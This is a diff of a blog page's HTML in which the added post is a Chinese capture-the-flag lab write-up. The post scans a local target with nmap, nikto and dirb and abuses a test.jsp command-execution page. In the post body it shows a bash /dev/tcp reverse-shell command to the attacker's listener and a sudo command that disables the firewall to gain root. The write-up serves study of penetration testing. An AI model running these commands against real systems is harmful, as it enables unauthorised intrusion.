@@ -6,15 +6,34 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020 | WebDogC</title>
+  <title>GetFlag-命令执行 | WebDogC</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="WebDogC">
-<meta property="og:url" content="http://yoursite.com/archives/2020/index.html">
+  <meta name="description" content="0x00前言&amp;emsp;&amp;emsp;本文是第七篇，介绍了通过命令执行获得root权限的过程，涉及知识点：工具nikto、dirb以及nmap的使用、linux基础命令、netcat监听反弹shell等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。0x01环境&amp;emsp;&amp;emsp;攻击机(kali)：192.168.3.107&amp;emsp;&amp;emsp;靶机(Ubuntu)：192.16">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GetFlag-命令执行">
+<meta property="og:url" content="http://yoursite.com/2020/05/06/GETFlag-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="WebDogC">
+<meta property="og:description" content="0x00前言&amp;emsp;&amp;emsp;本文是第七篇，介绍了通过命令执行获得root权限的过程，涉及知识点：工具nikto、dirb以及nmap的使用、linux基础命令、netcat监听反弹shell等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。0x01环境&amp;emsp;&amp;emsp;攻击机(kali)：192.168.3.107&amp;emsp;&amp;emsp;靶机(Ubuntu)：192.16">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%871.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%872.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%873.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%874.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%875.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%876.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%877.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%878.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%879.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%8710.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%8711.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%8712.png">
+<meta property="og:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%8713.png">
+<meta property="article:published_time" content="2020-05-05T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-06T05:50:33.949Z">
 <meta property="article:author" content="WebDogC">
+<meta property="article:tag" content="复现、CTF、study、flag、命令执行">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%871.png">
   
     <link rel="alternative" href="/atom.xml" title="WebDogC" type="application/atom+xml">
   
@@ -158,36 +177,57 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-GETFlag-命令执行" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/06/GETFlag-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="archive-article-date">
-  	<time datetime="2020-05-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-06</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/06/GETFlag-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">GetFlag-命令执行</a>
+    <h1 class="article-title" itemprop="name">
+      GetFlag-命令执行
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2020/05/06/GETFlag-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="archive-article-date">
+  	<time datetime="2020-05-05T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>0x00前言</strong><br>&emsp;&emsp;本文是第七篇，介绍了通过命令执行获得root权限的过程，涉及知识点：工具nikto、dirb以及nmap的使用、linux基础命令、netcat监听反弹shell等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.3.107<br>&emsp;&emsp;靶机(Ubuntu)：192.168.3.104<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、dirb、netcat、VMware、VirtualBox<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.3.104</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;开放端口： 8080(http)<br>&emsp;&emsp;Web容器信息：Apache Tomcat 1.1<br>&emsp;&emsp;针对开放http服务的8080端口，进一步探测敏感信息<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.3.104:8080</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;输入<code>dirb http://192.168.3.106:8080</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;扫描结果：<br>&emsp;&emsp;网站首页index.html、管理目录/manager/、测试页面test.jsp<br>&emsp;&emsp;<strong>深入挖掘</strong><br>&emsp;&emsp;打开浏览器访问靶机<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;成功访问，得到页面展示信，接下来访问manager目录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;需要账号密码登录，访问失败。查看test.jsp<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;得到一个关于系统命令的调试页面，输入<code>ls -l /tmp</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;成功回显信息，输入<code>ls -l /home</code>查看系统用户<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;查看bill目录<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;<strong>漏洞利用</strong><br>&emsp;&emsp;发现bill用户可以使用ssh远程登录，以及应该可以执行sudo命令<br>&emsp;&emsp;使用<code>bash -i</code>命令来反弹shell<br>&emsp;&emsp;<code>ssh bill@localhost sudo bash -i &gt;&amp; /dev/tcp/192.168.3.107/4444 0&gt;&amp;1</code><br>&emsp;&emsp;首先在kali上打开nc监听4444端口，输入命令<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;没有反应，信息探测时也没有发现开放的22端口，猜测是开启防火墙<br>&emsp;&emsp;尝试输入命令关闭防火墙，输入命令<code>ssh bill@localhost sudo ufw disable</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%8711.png" alt=""><br>&emsp;&emsp;再次尝试反弹shell<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%8712.png" alt=""><br>&emsp;&emsp;成功反弹一个root权限的终端，进入到root目录下<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%9B%BE%E7%89%8713.png" alt=""><br>&emsp;&emsp;成功获得Flag<br><strong>0x04总结</strong><br>&emsp;&emsp;此次渗透主要是利用了当前用户可执行sudo命令权限，使用ssh相关命令通过<code>bash -i</code>命令进行提权，用户目录中存在<code>.ssh</code>目录，信息探测时却没有探测到ssh端口服务，猜测是防火墙的原因，输入命令关闭防火墙，最终反弹了终端。</p>
+<p><br><br><br><br><font face="Georgia" color=#c4444>不想拿到“root”的渗透，不是好渗透。</font><br>作者：WebDogC</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -199,364 +239,105 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/05/06/GETFlag-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/05/GetFlag-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-05-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-05</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2020/05/05/GetFlag-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">GetFlag-暴力破解</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/05/GetFlag-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">GetFlag-暴力破解</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">复现、CTF、study、flag、暴力破解</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/03/GetFlag-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2/" class="archive-article-date">
-  	<time datetime="2020-05-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/03/GetFlag-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2/">GetFlag-文件包含-2</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">复现、CTF、study、flag、文件包含</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/02/GetFlag-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1/" class="archive-article-date">
-  	<time datetime="2020-05-01T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/02/GetFlag-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1/">GetFlag-文件包含-1</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">复现、CTF、study、flag、文件包含</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/01/GetFlag-XFF-SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2020-04-30T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/01/GetFlag-XFF-SQL%E6%B3%A8%E5%85%A5/">GetFlag-XFF-SQL注入</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">复现、CTF、study、SQL、XFF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/27/GetFlag-POST-SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2020-04-26T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/27/GetFlag-POST-SQL%E6%B3%A8%E5%85%A5/">GetFlag-POST-SQL注入</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">复现、CTF、study、SQL、POST</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/25/GetFlag-GET-SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2020-04-24T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/25/GetFlag-GET-SQL%E6%B3%A8%E5%85%A5/">GetFlag-GET-SQL注入</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">复现、CTF、study、SQL、GET</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/16/PHPSHECMS%20v1.7SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2020-04-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/16/PHPSHECMS%20v1.7SQL%E6%B3%A8%E5%85%A5/">PHPSHE v1.7-SQL注入复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">复现、PHPSHE</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/16/%E7%BB%95WAF/" class="archive-article-date">
-  	<time datetime="2020-04-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/16/%E7%BB%95WAF/">绕WAF</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">绕WAF、WAF、security、Web安全、note</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/15/OWASP%20TOP%2010/" class="archive-article-date">
-  	<time datetime="2020-04-14T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/15/OWASP%20TOP%2010/">WASP TOP 10(2017)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">OWASP TOP 10、note、security</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/2020/page/2/">2</a><a class="page-number" href="/archives/2020/page/3/">3</a><a class="extend next" rel="next" href="/archives/2020/page/2/">Next &amp;raquo;</a>
-    </nav>
   
 
 
@@ -580,8 +361,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
